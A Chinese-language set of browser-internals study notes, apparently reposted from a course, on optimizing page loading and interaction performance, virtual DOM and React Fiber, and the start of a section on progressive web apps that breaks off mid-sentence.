页面性能：如何系统地优化页面？</h2><p>在前面几篇文章中，我们分析了页面加载和 DOM 生成，讨论了 JavaScript 和 CSS 是如何影响到 DOM 生成的，还结合渲染流水线来讲解了分层和合成机制，同时在这些文章里面，我们还穿插说明了很多优化页面性能的最佳实践策略。通过这些知识点的学习，相信你已经知道渲染引擎是怎么绘制出帧的，不过之前我们介绍的内容比较零碎、比较散，那么今天我们就来将这些内容系统性地串起来。</p><p>那么怎么才能把这些知识点串起来呢？我的思路是从如何系统优化页面速度的角度来切入。</p><p><strong>这里我们所谈论的页面优化，其实就是要让页面更快地显示和响应</strong>。由于一个页面在它不同的阶段，所侧重的关注点是不一样的，所以如果我们要讨论页面优化，就要分析一个页面生存周期的不同阶段。</p><p>通常一个页面有三个阶段：<strong>加载阶段、交互阶段和关闭阶段</strong>。</p><ul><li>加载阶段，是指从发出请求到渲染出完整页面的过程，影响到这个阶段的主要因素有网络和 JavaScript 脚本。</li><li>交互阶段，主要是从页面加载完成到用户交互的整合过程，影响到这个阶段的主要因素是 JavaScript 脚本。</li><li>关闭阶段，主要是用户发出关闭指令后页面所做的一些清理操作。</li></ul><p>这里我们需要<strong>重点关注加载阶段和交互阶段</strong>，因为影响到我们体验的因素主要都在这两个阶段，下面我们就来逐个详细分析下。</p><h3 id="加载阶段"><a href="#加载阶段" class="headerlink" title="加载阶段"></a>加载阶段</h3><p>我们先来分析如何系统优化加载阶段中的页面，还是先看一个典型的渲染流水线，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222818284.png" alt="image-20221014222818284"></p><p>观察上面这个渲染流水线，你能分析出来有哪些因素影响了页面加载速度吗？下面我们就先来分析下这个问题。</p><p>通过前面文章的讲解，你应该已经知道了并非所有的资源都会阻塞页面的首次绘制，比如图片、音频、视频等文件就不会阻塞页面的首次渲染；而 JavaScript、首次请求的 HTML 资源文件、CSS 文件是会阻塞首次渲染的，因为在构建 DOM 的过程中需要 HTML 和 JavaScript 文件，在构造渲染树的过程中需要用到 CSS 文件。</p><p>我们把<strong>这些能阻塞网页首次渲染的资源称为关键资源</strong>。基于关键资源，我们可以继续细化出来三个影响页面首次渲染的核心因素。</p><p><strong>第一个是关键资源个数</strong>。关键资源个数越多，首次页面的加载时间就会越长。比如上图中的关键资源个数就是 3 个，1 个 HTML 文件、1 个 JavaScript 和 1 个 CSS 文件。</p><p><strong>第二个是关键资源大小</strong>。通常情况下，所有关键资源的内容越小，其整个资源的下载时间也就越短，那么阻塞渲染的时间也就越短。上图中关键资源的大小分别是 6KB、8KB 和 9KB，那么整个关键资源大小就是 23KB。</p><p><strong>第三个是请求关键资源需要多少个 RTT（Round Trip Time）</strong>。那什么是 RTT 呢？ 在<a href="https://time.geekbang.org/column/article/113550">《02 | TCP 协议：如何保证页面文件能被完整送达浏览器？》</a>这篇文章中我们分析过，当使用 TCP 协议传输一个文件时，比如这个文件大小是 0.1M，由于 TCP 的特性，这个数据并不是一次传输到服务端的，而是需要拆分成一个个数据包来回多次进行传输的。<strong>RTT 就是这里的往返时延。它是网络中一个重要的性能指标，表示从发送端发送数据开始，到发送端收到来自接收端的确认，总共经历的时延</strong>。通常 1 个 HTTP 的数据包在 14KB 左右，所以 1 个 0.1M 的页面就需要拆分成 8 个包来传输了，也就是说需要 8 个 RTT。</p><p>我们可以结合上图来看看它的关键资源请求需要多少个 RTT。首先是请求 HTML 资源，大小是 6KB，小于 14KB，所以 1 个 RTT 就可以解决了。至于 JavaScript 和 CSS 文件，这里需要注意一点，由于渲染引擎有一个预解析的线程，在接收到 HTML 数据之后，预解析线程会快速扫描 HTML 数据中的关键资源，一旦扫描到了，会立马发起请求，你可以认为 JavaScript 和 CSS 是同时发起请求的，所以它们的请求是重叠的，那么计算它们的 RTT 时，只需要计算体积最大的那个数据就可以了。这里最大的是 CSS 文件（9KB），所以我们就按照 9KB 来计算，同样由于 9KB 小于 14KB，所以 JavaScript 和 CSS 资源也就可以算成 1 个 RTT。也就是说，上图中关键资源请求共花费了 2 个 RTT。</p><p>了解了影响加载过程中的几个核心因素之后，接下来我们就可以系统性地考虑优化方案了。<strong>总的优化原则就是减少关键资源个数，降低关键资源大小，降低关键资源的 RTT 次数</strong>。</p><ul><li>如何减少关键资源的个数？一种方式是可以将 JavaScript 和 CSS 改成内联的形式，比如上图的 JavaScript 和 CSS，若都改成内联模式，那么关键资源的个数就由 3 个减少到了 1 个。另一种方式，如果 JavaScript 代码没有 DOM 或者 CSSOM 的操作，则可以改成 sync 或者 defer 属性；同样对于 CSS，如果不是在构建页面之前加载的，则可以添加媒体取消阻止显现的标志。当 JavaScript 标签加上了 sync 或者 defer、CSSlink 属性之前加上了取消阻止显现的标志后，它们就变成了非关键资源了。</li><li>如何减少关键资源的大小？可以压缩 CSS 和 JavaScript 资源，移除 HTML、CSS、JavaScript 文件中一些注释内容，也可以通过前面讲的取消 CSS 或者 JavaScript 中关键资源的方式。</li><li>如何减少关键资源 RTT 的次数？可以通过减少关键资源的个数和减少关键资源的大小搭配来实现。除此之外，还可以使用 CDN 来减少每次 RTT 时长。</li></ul><p>在优化实际的页面加载速度时，你可以先画出优化之前关键资源的图表，然后按照上面优化关键资源的原则去优化，优化完成之后再画出优化之后的关键资源图表。</p><h3 id="交互阶段"><a href="#交互阶段" class="headerlink" title="交互阶段"></a>交互阶段</h3><p>接下来我们再来聊聊页面加载完成之后的交互阶段以及应该如何去优化。谈交互阶段的优化，其实就是在谈渲染进程渲染帧的速度，因为在交互阶段，帧的渲染速度决定了交互的流畅度。因此讨论页面优化实际上就是讨论渲染引擎是如何渲染帧的，否则就无法优化帧率。</p><p>我们先来看看交互阶段的渲染流水线（如下图）。和加载阶段的渲染流水线有一些不同的地方是，在交互阶段没有了加载关键资源和构建 DOM、CSSOM 流程，通常是由 JavaScript 触发交互动画的。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222829172.png" alt="image-20221014222829172"></p><p>结合上图，我们来一起回顾下交互阶段是如何生成一个帧的。大部分情况下，生成一个新的帧都是由 JavaScript 通过修改 DOM 或者 CSSOM 来触发的。还有另外一部分帧是由 CSS 来触发的。</p><p>如果在计算样式阶段发现有布局信息的修改，那么就会触发<strong>重排</strong>操作，然后触发后续渲染流水线的一系列操作，这个代价是非常大的。</p><p>同样如果在计算样式阶段没有发现有布局信息的修改，只是修改了颜色一类的信息，那么就不会涉及到布局相关的调整，所以可以跳过布局阶段，直接进入绘制阶段，这个过程叫<strong>重绘</strong>。不过重绘阶段的代价也是不小的。</p><p>还有另外一种情况，通过 CSS 实现一些变形、渐变、动画等特效，这是由 CSS 触发的，并且是在合成线程上执行的，这个过程称为合成。因为它不会触发重排或者重绘，而且合成操作本身的速度就非常快，所以执行合成是效率最高的方式。</p><p>回顾了在交互过程中的帧是如何生成的，那接下来我们就可以讨论优化方案了。<strong>一个大的原则就是让单个帧的生成速度变快</strong>。所以，下面我们就来分析下在交互阶段渲染流水线中有哪些因素影响了帧的生成速度以及如何去优化。</p><h4 id="1-减少-JavaScript-脚本执行时间"><a href="#1-减少-JavaScript-脚本执行时间" class="headerlink" title="1. 减少 JavaScript 脚本执行时间"></a>1. 减少 JavaScript 脚本执行时间</h4><p>有时 JavaScript 函数的一次执行时间可能有几百毫秒，这就严重霸占了主线程执行其他渲染任务的时间。针对这种情况我们可以采用以下两种策略：</p><ul><li>一种是将一次执行的函数分解为多个任务，使得每次的执行时间不要过久。</li><li>另一种是采用 Web Workers。你可以把 Web Workers 当作主线程之外的一个线程，在 Web Workers 中是可以执行 JavaScript 脚本的，不过 Web Workers 中没有 DOM、CSSOM 环境，这意味着在 Web Workers 中是无法通过 JavaScript 来访问 DOM 的，所以我们可以把一些和 DOM 操作无关且耗时的任务放到 Web Workers 中去执行。</li></ul><p>总之，在交互阶段，对 JavaScript 脚本总的原则就是不要一次霸占太久主线程。</p><h4 id="2-避免强制同步布局"><a href="#2-避免强制同步布局" class="headerlink" title="2. 避免强制同步布局"></a>2. 避免强制同步布局</h4><p>在介绍强制同步布局之前，我们先来聊聊正常情况下的布局操作。通过 DOM 接口执行添加元素或者删除元素等操作后，是需要重新计算样式和布局的，不过正常情况下这些操作都是在另外的任务中异步完成的，这样做是为了避免当前的任务占用太长的主线程时间。为了直观理解，你可以参考下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;mian_div&quot;&gt;</span><br><span class="line">        &lt;li id=&quot;time_li&quot;&gt;time&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;geekbang&lt;/li&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p id=&quot;demo&quot;&gt; 强制布局 demo&lt;/p&gt;</span><br><span class="line">    &lt;button onclick=&quot;foo()&quot;&gt; 添加新元素 &lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        function foo() &#123;</span><br><span class="line">            let main_div = document.getElementById(&quot;mian_div&quot;)</span><br><span class="line">            let new_node = document.createElement(&quot;li&quot;)</span><br><span class="line">            let textnode = document.createTextNode(&quot;time.geekbang&quot;)</span><br><span class="line">            new_node.appendChild(textnode);</span><br><span class="line">            document.getElementById(&quot;mian_div&quot;).appendChild(new_node);</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>对于上面这段代码，我们可以使用 Performance 工具来记录添加元素的过程，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222839522.png" alt="image-20221014222839522"></p><p>从图中可以看出来，执行 JavaScript 添加元素是在一个任务中执行的，重新计算样式布局是在另外一个任务中执行，这就是正常情况下的布局操作。</p><p>理解了正常情况下的布局操作，接下来我们就可以聊什么是强制同步布局了。</p><p><strong>所谓强制同步布局，是指 JavaScript 强制将计算样式和布局操作提前到当前的任务中</strong>。为了直观理解，这里我们对上面的代码做了一点修改，让它变成强制同步布局，修改后的代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    let main_div = document.getElementById(&quot;mian_div&quot;)</span><br><span class="line">    let new_node = document.createElement(&quot;li&quot;)</span><br><span class="line">    let textnode = document.createTextNode(&quot;time.geekbang&quot;)</span><br><span class="line">    new_node.appendChild(textnode);</span><br><span class="line">    document.getElementById(&quot;mian_div&quot;).appendChild(new_node);</span><br><span class="line">    // 由于要获取到 offsetHeight，</span><br><span class="line">    // 但是此时的 offsetHeight 还是老的数据，</span><br><span class="line">    // 所以需要立即执行布局操作</span><br><span class="line">    console.log(main_div.offsetHeight)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将新的元素添加到 DOM 之后，我们又调用了<code>main_div.offsetHeight</code>来获取新 main_div 的高度信息。如果要获取到 main_div 的高度，就需要重新布局，所以这里在获取到 main_div 的高度之前，JavaScript 还需要强制让渲染引擎默认执行一次布局操作。我们把这个操作称为强制同步布局。</p><p>同样，你可以看下面通过 Performance 记录的任务状态：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222848610.png" alt="image-20221014222848610"></p><p>从上图可以看出来，计算样式和布局都是在当前脚本执行过程中触发的，这就是强制同步布局。</p><p>为了避免强制同步布局，我们可以调整策略，在修改 DOM 之前查询相关值。代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    let main_div = document.getElementById(&quot;mian_div&quot;)</span><br><span class="line">    // 为了避免强制同步布局，在修改 DOM 之前查询相关值</span><br><span class="line">    console.log(main_div.offsetHeight)</span><br><span class="line">    let new_node = document.createElement(&quot;li&quot;)</span><br><span class="line">    let textnode = document.createTextNode(&quot;time.geekbang&quot;)</span><br><span class="line">    new_node.appendChild(textnode);</span><br><span class="line">    document.getElementById(&quot;mian_div&quot;).appendChild(new_node);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-避免布局抖动"><a href="#3-避免布局抖动" class="headerlink" title="3. 避免布局抖动"></a>3. 避免布局抖动</h4><p>还有一种比强制同步布局更坏的情况，那就是布局抖动。所谓布局抖动，是指在一次 JavaScript 执行过程中，多次执行强制布局和抖动操作。为了直观理解，你可以看下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    let time_li = document.getElementById(&quot;time_li&quot;)</span><br><span class="line">    for (let i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">        let main_div = document.getElementById(&quot;mian_div&quot;)</span><br><span class="line">        let new_node = document.createElement(&quot;li&quot;)</span><br><span class="line">        let textnode = document.createTextNode(&quot;time.geekbang&quot;)</span><br><span class="line">        new_node.appendChild(textnode);</span><br><span class="line">        new_node.offsetHeight = time_li.offsetHeight;</span><br><span class="line">        document.getElementById(&quot;mian_div&quot;).appendChild(new_node);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在一个 for 循环语句里面不断读取属性值，每次读取属性值之前都要进行计算样式和布局。执行代码之后，使用 Performance 记录的状态如下所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222858137.png" alt="image-20221014222858137"></p><p>从上图可以看出，在 foo 函数内部重复执行计算样式和布局，这会大大影响当前函数的执行效率。这种情况的避免方式和强制同步布局一样，都是尽量不要在修改 DOM 结构时再去查询一些相关值。</p><h4 id="4-合理利用-CSS-合成动画"><a href="#4-合理利用-CSS-合成动画" class="headerlink" title="4. 合理利用 CSS 合成动画"></a>4. 合理利用 CSS 合成动画</h4><p>合成动画是直接在合成线程上执行的，这和在主线程上执行的布局、绘制等操作不同，如果主线程被 JavaScript 或者一些布局任务占用，CSS 动画依然能继续执行。所以要尽量利用好 CSS 合成动画，如果能让 CSS 处理动画，就尽量交给 CSS 来操作。</p><p>另外，如果能提前知道对某个元素执行动画操作，那就最好将其标记为 will-change，这是告诉渲染引擎需要将该元素单独生成一个图层。</p><h4 id="5-避免频繁的垃圾回收"><a href="#5-避免频繁的垃圾回收" class="headerlink" title="5. 避免频繁的垃圾回收"></a>5. 避免频繁的垃圾回收</h4><p>我们知道 JavaScript 使用了自动垃圾回收机制，如果在一些函数中频繁创建临时对象，那么垃圾回收器也会频繁地去执行垃圾回收策略。这样当垃圾回收操作发生时，就会占用主线程，从而影响到其他任务的执行，严重的话还会让用户产生掉帧、不流畅的感觉。</p><p>所以要尽量避免产生那些临时垃圾数据。那该怎么做呢？可以尽可能优化储存结构，尽可能避免小颗粒对象的产生。</p><h3 id="总结-24"><a href="#总结-24" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p><p>我们主要讲解了如何系统优化加载阶段和交互阶段的页面。</p><p>在加载阶段，核心的优化原则是：优化关键资源的加载速度，减少关键资源的个数，降低关键资源的 RTT 次数。</p><p>在交互阶段，核心的优化原则是：尽量减少一帧的生成时间。可以通过减少单次 JavaScript 的执行时间、避免强制同步布局、避免布局抖动、尽量采用 CSS 的合成动画、避免频繁的垃圾回收等方式来减少一帧生成的时长。</p><p>虚拟 DOM 是最近非常火的技术，两大著名前端框架 React 和 Vue 都使用了虚拟 DOM，所以我觉得非常有必要结合浏览器的工作机制对虚拟 DOM 进行一次分析。当然了，React 和 Vue 框架本身所蕴含的知识点非常多，而且也不是我们专栏的重点，所以在这里我们还是把重心聚焦在虚拟 DOM 上。</p><p>在本文我们会先聊聊 DOM 的一些缺陷，然后在此基础上介绍虚拟 DOM 是如何解决这些缺陷的，最后再站在双缓存和 MVC 的视角来聊聊虚拟 DOM。理解了这些会让你对目前的前端框架有一个更加底层的认识，这也有助于你更好地理解这些前端框架。</p><h2 id="6-虚拟-DOM：虚拟-DOM-和实际的-DOM-有何不同？"><a href="#6-虚拟-DOM：虚拟-DOM-和实际的-DOM-有何不同？" class="headerlink" title="6. 虚拟 DOM：虚拟 DOM 和实际的 DOM 有何不同？"></a>6. 虚拟 DOM：虚拟 DOM 和实际的 DOM 有何不同？</h2><p>虚拟 DOM 是最近非常火的技术，两大著名前端框架 React 和 Vue 都使用了虚拟 DOM，所以我觉得非常有必要结合浏览器的工作机制对虚拟 DOM 进行一次分析。当然了，React 和 Vue 框架本身所蕴含的知识点非常多，而且也不是我们专栏的重点，所以在这里我们还是把重心聚焦在虚拟 DOM 上。</p><p>在本文我们会先聊聊 DOM 的一些缺陷，然后在此基础上介绍虚拟 DOM 是如何解决这些缺陷的，最后再站在双缓存和 MVC 的视角来聊聊虚拟 DOM。理解了这些会让你对目前的前端框架有一个更加底层的认识，这也有助于你更好地理解这些前端框架。</p><h3 id="DOM-的缺陷"><a href="#DOM-的缺陷" class="headerlink" title="DOM 的缺陷"></a>DOM 的缺陷</h3><p>通过前面一系列文章的学习，你对 DOM 的生成过程应该已经有了比较深刻的理解，并且也知道了通过 JavaScript 操纵 DOM 是会影响到整个渲染流水线的。另外，DOM 还提供了一组 JavaScript 接口用来遍历或者修改节点，这套接口包含了 getElementById、removeChild、appendChild 等方法。</p><p>比如，我们可以调用<code>document.body.appendChild(node)</code>往 body 节点上添加一个元素，调用该 API 之后会引发一系列的连锁反应。首先渲染引擎会将 node 节点添加到 body 节点之上，然后触发样式计算、布局、绘制、栅格化、合成等任务，我们把这一过程称为<strong>重排</strong>。除了重排之外，还有可能引起<strong>重绘</strong>或者<strong>合成</strong>操作，形象地理解就是“<strong>牵一发而动全身</strong>”。另外，对于 DOM 的不当操作还有可能引发<strong>强制同步布局</strong>和<strong>布局抖动</strong>的问题，这些操作都会大大降低渲染效率。因此，对于 DOM 的操作我们时刻都需要非常小心谨慎。</p><p>当然，对于简单的页面来说，其 DOM 结构还是比较简单的，所以以上这些操作 DOM 的问题并不会对用户体验产生太多影响。但是对于一些复杂的页面或者目前使用非常多的单页应用来说，其 DOM 结构是非常复杂的，而且还需要不断地去修改 DOM 树，每次操作 DOM 渲染引擎都需要进行重排、重绘或者合成等操作，因为 DOM 结构复杂，所生成的页面结构也会很复杂，对于这些复杂的页面，执行一次重排或者重绘操作都是非常耗时的，这就给我们带来了真正的性能问题。</p><p>所以我们需要有一种方式来减少 JavaScript 对 DOM 的操作，这时候虚拟 DOM 就上场了。</p><h3 id="什么是虚拟-DOM"><a href="#什么是虚拟-DOM" class="headerlink" title="什么是虚拟 DOM"></a>什么是虚拟 DOM</h3><p>在谈论什么是虚拟 DOM 之前，我们先来看看虚拟 DOM 到底要解决哪些事情。</p><ul><li>将页面改变的内容应用到虚拟 DOM 上，而不是直接应用到 DOM 上。</li><li>变化被应用到虚拟 DOM 上时，虚拟 DOM 并不急着去渲染页面，而仅仅是调整虚拟 DOM 的内部状态，这样操作虚拟 DOM 的代价就变得非常轻了。</li><li>在虚拟 DOM 收集到足够的改变时，再把这些变化一次性应用到真实的 DOM 上。</li></ul><p>基于以上三点，我们再来看看什么是虚拟 DOM。为了直观理解，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222925677.png" alt="image-20221014222925677"></p><p>该图是我结合 React 流程画的一张虚拟 DOM 执行流程图，下面我们就结合这张图来分析下虚拟 DOM 到底怎么运行的。</p><ul><li><strong>创建阶段</strong>。首先依据 JSX 和基础数据创建出来虚拟 DOM，它反映了真实的 DOM 树的结构。然后由虚拟 DOM 树创建出真实 DOM 树，真实的 DOM 树生成完后，再触发渲染流水线往屏幕输出页面。</li><li><strong>更新阶段</strong>。如果数据发生了改变，那么就需要根据新的数据创建一个新的虚拟 DOM 树；然后 React 比较两个树，找出变化的地方，并把变化的地方一次性更新到真实的 DOM 树上；最后渲染引擎更新渲染流水线，并生成新的页面。</li></ul><p>既然聊到虚拟 DOM 的更新，那我们就不得不聊聊最新的<strong>React Fiber 更新机制</strong>。通过上图我们知道，当有数据更新时，React 会生成一个新的虚拟 DOM，然后拿新的虚拟 DOM 和之前的虚拟 DOM 进行比较，这个过程会找出变化的节点，然后再将变化的节点应用到 DOM 上。</p><p>这里我们重点关注下比较过程，最开始的时候，比较两个虚拟 DOM 的过程是在一个递归函数里执行的，其<strong>核心算法是 reconciliation</strong>。通常情况下，这个比较过程执行得很快，不过当虚拟 DOM 比较复杂的时候，执行比较函数就有可能占据主线程比较久的时间，这样就会导致其他任务的等待，造成页面卡顿。为了解决这个问题，React 团队重写了 reconciliation 算法，新的算法称为 Fiber reconciler，之前老的算法称为 Stack reconciler。</p><p>在前面<a href="https://time.geekbang.org/column/article/137827">《20 | async&#x2F;await：使用同步的方式去写异步代码》</a>那篇文章中我们介绍了协程，其实协程的另外一个称呼就是 Fiber，所以在这里我们可以把 Fiber 和协程关联起来，那么所谓的 Fiber reconciler 相信你也很清楚了，就是在执行算法的过程中出让主线程，这样就解决了 Stack reconciler 函数占用时间过久的问题。至于具体的实现过程在这里我就不详细分析了，如果感兴趣的话，你可以自行查阅相关资料进行学习。</p><p>了解完虚拟 DOM 的大致执行流程，你应该也就知道为何需要虚拟 DOM 了。不过以上都从单纯的技术视角来分析虚拟 DOM 的，那接下来我们再从双缓存和 MVC 模型这两个视角来聊聊虚拟 DOM。</p><h4 id="1-双缓存"><a href="#1-双缓存" class="headerlink" title="1. 双缓存"></a>1. 双缓存</h4><p>在开发游戏或者处理其他图像的过程中，屏幕从前缓冲区读取数据然后显示。但是很多图形操作都很复杂且需要大量的运算，比如一幅完整的画面，可能需要计算多次才能完成，如果每次计算完一部分图像，就将其写入缓冲区，那么就会造成一个后果，那就是在显示一个稍微复杂点的图像的过程中，你看到的页面效果可能是一部分一部分地显示出来，因此在刷新页面的过程中，会让用户感受到界面的闪烁。</p><p>而使用双缓存，可以让你先将计算的中间结果存放在另一个缓冲区中，等全部的计算结束，该缓冲区已经存储了完整的图形之后，再将该缓冲区的图形数据一次性复制到显示缓冲区，这样就使得整个图像的输出非常稳定。</p><p>在这里，你可以把虚拟 DOM 看成是 DOM 的一个 buffer，和图形显示一样，它会在完成一次完整的操作之后，再把结果应用到 DOM 上，这样就能减少一些不必要的更新，同时还能保证 DOM 的稳定输出。</p><h4 id="2-MVC-模式"><a href="#2-MVC-模式" class="headerlink" title="2. MVC 模式"></a>2. MVC 模式</h4><p>到这里我们了解了虚拟 DOM 是一种类似双缓存的实现。不过如果站在技术角度来理解虚拟缓存，依然不能全面理解其含义。那么接下来我们再来看看虚拟 DOM 在 MVC 模式中所扮演的角色。</p><p>在各大设计模式当中，MVC 是一个非常重要且应用广泛的模式，因为它能将数据和视图进行分离，在涉及到一些复杂的项目时，能够大大减轻项目的耦合度，使得程序易于维护。</p><p>关于 MVC 的基础结构，你可以先参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222937758.png" alt="image-20221014222937758"></p><p>通过上图你可以发现，MVC 的整体结构比较简单，由模型、视图和控制器组成，其<strong>核心思想就是将数据和视图分离</strong>，也就是说视图和模型之间是不允许直接通信的，它们之间的通信都是通过控制器来完成的。通常情况下的通信路径是视图发生了改变，然后通知控制器，控制器再根据情况判断是否需要更新模型数据。当然还可以根据不同的通信路径和控制器不同的实现方式，基于 MVC 又能衍生出很多其他的模式，如 MVP、MVVM 等，不过万变不离其宗，它们的基础骨架都是基于 MVC 而来。</p><p>所以在分析基于 React 或者 Vue 这些前端框架时，我们需要先重点把握大的 MVC 骨架结构，然后再重点查看通信方式和控制器的具体实现方式，这样我们就能从架构的视角来理解这些前端框架了。比如在分析 React 项目时，我们可以把 React 的部分看成是一个 MVC 中的视图，在项目中结合 Redux 就可以构建一个 MVC 的模型结构，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222948929.png" alt="image-20221014222948929"></p><p>在该图中，我们可以把虚拟 DOM 看成是 MVC 的视图部分，其控制器和模型都是由 Redux 提供的。其具体实现过程如下：</p><ul><li>图中的控制器是用来监控 DOM 的变化，一旦 DOM 发生变化，控制器便会通知模型，让其更新数据；</li><li>模型数据更新好之后，控制器会通知视图，告诉它模型的数据发生了变化；</li><li>视图接收到更新消息之后，会根据模型所提供的数据来生成新的虚拟 DOM；</li><li>新的虚拟 DOM 生成好之后，就需要与之前的虚拟 DOM 进行比较，找出变化的节点；</li><li>比较出变化的节点之后，React 将变化的虚拟节点应用到 DOM 上，这样就会触发 DOM 节点的更新；</li><li>DOM 节点的变化又会触发后续一系列渲染流水线的变化，从而实现页面的更新。</li></ul><p>在实际工程项目中，你需要学会分析出这各个模块，并梳理出它们之间的通信关系，这样对于任何框架你都能轻松上手了。</p><h3 id="总结-25"><a href="#总结-25" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p><p>首先我们分析了直接操作 DOM 会触发渲染流水线的一系列反应，如果对 DOM 操作不当的话甚至还会触发强制同步布局和布局抖动的问题，这也是我们在操作 DOM 时需要非常小心谨慎的原因。</p><p>在此分析的基础上，我们介绍了虚拟 DOM 是怎么解决直接操作 DOM 所带来的问题以及 React Fiber 更新机制。</p><p>要聊前端框架，就绕不开设计模式，所以接下来我们又从双缓存和 MVC 角度分析了虚拟 DOM。双缓存是一种经典的思路，应用在很多场合，能解决页面无效刷新和闪屏的问题，虚拟 DOM 就是双缓存思想的一种体现。而基于 MVC 的设计思想也广泛地渗透到各种场合，并且基于 MVC 又衍生出了很多其他模式（如 MVP、MVVM 等），不过万变不离其宗，它们的基础骨架都是基于 MVC 而来。站在 MVC 视角来理解虚拟 DOM 能让你看到更为“广阔的世界”。</p><h2 id="7-渐进式网页应用（PWA）：它究竟解决了-Web-应用的哪些问题？"><a href="#7-渐进式网页应用（PWA）：它究竟解决了-Web-应用的哪些问题？" class="headerlink" title="7. 渐进式网页应用（PWA）：它究竟解决了 Web 应用的哪些问题？"></a>7. 渐进式网页应用（PWA）：它究竟解决了 Web 应用的哪些问题？</h2><p>在专栏<a href="https://time.geekbang.org/column/article/113399">开篇词</a>中，我们提到过浏览器的三大进化路线：</p><ul><li>第一个是应用程序 Web 化；</li><li>第二个是 Web 应用移动化；</li><li>第三个是 Web 操作系统化；</li></ul><p>其中，第二个 Web 应用移动化是 Google 梦寐以求而又一直在发力的一件事，不过对于移动设备来说，前有本地 App，后有移动小程序，想要浏览器切入到移动端是相当困难的一件事，因为浏览器的运行性能是低于本地 App 的，并且 Google 也没有类似微信或者 Facebook 这种体量的用户群体。</p><p>但是要让浏览器切入到移动端，让其取得和原生应用同等待遇可是 Google 的梦想，那该怎么做呢？</p><p>这就是我们本节要聊的 PWA。那什么是 PWA？PWA 又是以什么方式切入到移动端的呢？</p><p>PWA，全称是 Progressive Web App，翻译过来就是渐进式网页应用。根据字面意思，它就是“渐进式 +Web 应用”。对于 Web 应用很好理解了，就是目前我们普通的 Web 页面，所以 PWA 所支持的首先是一个 Web 页面。至于“渐进式”，就需要从下面两个方面来理解。</p><ul><li>站在 Web 应用开发者来说，PWA 提供了一个渐进式的过渡方案，让普通站点逐步过渡到 Web 应用。采取渐进式可以降低站点改造的代价，使得站点逐步支持各项新技术，而不是一步到位。</li><li>站在技术角度来说，PWA 技术也是一个渐进式的演化过程，在技术层面会一点点演进，比如逐渐提供更好的设备特性支持，不断优化更加流畅的动画效果，不断让页面的加载速度变得更快，不断实现本地应用的特性。</li></ul><p>从这两点可以看出来，PWA 采取的是非常一个缓和的渐进式策略，不再像以前那样激进，动不动就是取代本地 App、取代小程序。与之相反，而是要充分发挥 Web 的优势，渐进式地缩短和本地应用或者小程序的距离。</p><p>那么 Web 最大的优势是什么呢？我认为是自由开放，也正是因为自由和开放，所以大家就很容易对同一件事情达成共识，达成共识之后，一套代码就可以运行在各种设备之上了，这就是跨平台，这也恰恰是本地应用所不具备的。而对于小程序，倒是可以实现跨平台，但要让各家达成共识，目前来看，似乎还是非常不切实际的。</p><p>所以我给 PWA 的定义就是：<strong>它是一套理念，渐进式增强 Web 的优势，并通过技术手段渐进式缩短和本地应用或者小程序的距离</strong>。基于这套理念之下的技术都可以归类到 PWA。</p><p>那今天我们就主要来聊聊 PWA 主要采用了哪些技术手段来缩短它和本地应用或者小程序的距离。</p><h3 id="Web-应用-VS-本地应用"><a href="#Web-应用-VS-本地应用" class="headerlink" title="Web 应用 VS 本地应用"></a>Web 应用 VS 本地应用</h3><p>那相对于本地应用，Web 页面到底缺少了什么？</p><ul><li>首先，Web 应用缺少离线使用能力，在离线或者在弱网环境下基本上是无法使用的。而用户需要的是沉浸式的体验，在离线或者弱网环境下能够流畅地使用是用户对一个应用的基本要求。</li><li>其次，Web 应用还缺少了消息推送的能力，因为作为一个 App 厂商，需要有将消息送达到应用的能力。</li><li>最后，Web 应用缺少一级入口，也就是将 Web 应用安装到桌面，在需要的时候直接从桌面打开 Web 应用，而不是每次都需要通过浏览器来打开。</li></ul><p><strong>针对以上 Web 缺陷，PWA 提出了两种解决方案：通过引入 Service Worker 来试着解决离线存储和消息推送的问题，通过引入 manifest.json 来解决一级入口的问题</strong>。下面我们就来详细分析下 Service Worker 是如何工作的。</p><h3 id="什么是-Service-Worker"><a href="#什么是-Service-Worker" class="headerlink" title="什么是 Service Worker"></a>什么是 Service Worker</h3><p>我们先来看看 Service Worker 是怎么解决离线存储和消息推送的问题。</p><p>其实在 Service Worker 之前，WHATWG 小组就推出过用 App Cache 标准来缓存页面，不过在使用过程中 App Cache 所暴露的问题比较多，遭到多方吐槽，所以这个标准最终也只能被废弃了，可见一个成功的标准是需要经历实践考量的。</p><p>所以在 2014 年的时候，标准委员会就提出了 Service Worker 